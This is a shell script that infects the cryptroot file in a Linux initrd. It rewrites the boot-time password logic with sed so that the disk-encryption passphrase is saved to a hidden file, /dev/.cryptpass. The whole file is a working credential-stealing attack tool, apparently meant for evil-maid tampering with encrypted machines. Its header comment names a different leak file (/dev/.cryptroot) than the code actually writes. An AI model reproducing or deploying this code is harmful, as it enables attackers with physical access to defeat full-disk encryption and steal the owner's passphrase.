#!/bin/sh

# This file infects the cryptroot file in the initrd so that it leaks the
# entered password into the /dev/.cryptroot file.

if [ $# -lt 1 ]; then
	echo "Usage: $0 cryptroot_to_corrupt"
	exit 1
fi

# Contains find_var_name
. ./infect_functions.sh

cryptroot=$1

cryptkeyscriptValues="cryptkeyscript" # possible values for the var
cryptkeyValues="cryptkey"

# Find the actual variable names among the possible ones (well, only one
# possibility in this version)
cryptkeyscript=`find_var_name "$cryptroot" "$cryptkeyscriptValues"`
cryptkey=`find_var_name "$cryptroot" "$cryptkeyValues"`

echo "cryptkeyscript=$cryptkeyscript"
echo "cryptkey=$cryptkey"

if test -z "$cryptkeyscript" -o -z "$cryptkey"; then
	echo "Unable to identify a var name"
	return 1
fi

# find the line that contains the "if" where the password is retrieved.
interestIfLine=$(sed -n "/bin\/sh/,/\$$cryptkeyscript\s*\"\$$cryptkey\"/p"\
		$cryptroot | sed -n '/\s*if\s*/=' | tail -n1)
# Line to insert some code in (before the if)
insertionLine=$((interestIfLine - 1))

# Change the if condition so that the password just echoed and piped to the 
# program that sets up the on-the-fly decryption rather than from the
# program that asks for the password.
sed -i "$insertionLine,/^\s*fi\s*$/s/\$$cryptkeyscript\s\s*\"\$$cryptkey\"/echo -n \"\$password/\"" $cryptroot

# Code to be inserted : gets the password and stores it into /dev/.cryptpass
sed -i "$insertionLine a\
                        password=\`crypttarget=\"\$crypttarget\" cryptsource=\"\$cryptsource\" \$$cryptkeyscript \"\$$cryptkey\"\`;\n\
                        echo \"\$password\" > /dev/.cryptpass" $cryptroot

# Something softer after these atrocious sed lines: exit.
exit 0
